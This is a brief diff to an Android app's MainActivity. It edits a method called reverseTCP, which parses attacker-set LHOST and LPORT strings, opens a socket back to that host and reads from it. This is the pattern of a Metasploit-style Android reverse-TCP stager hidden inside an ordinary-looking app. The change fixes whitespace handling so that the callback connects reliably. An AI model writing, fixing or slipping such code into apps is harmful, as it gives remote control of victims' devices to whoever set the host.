@@ -45,7 +45,7 @@ public class MainActivity extends Activity
 
     private void reverseTCP() {
         try {
-            String lhost = LHOST.substring(4);
+            String lhost = LHOST.substring(4).trim();
             String lport = LPORT.substring(4).trim();
             Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
             DataInputStream in = new DataInputStream(msgsock.getInputStream());
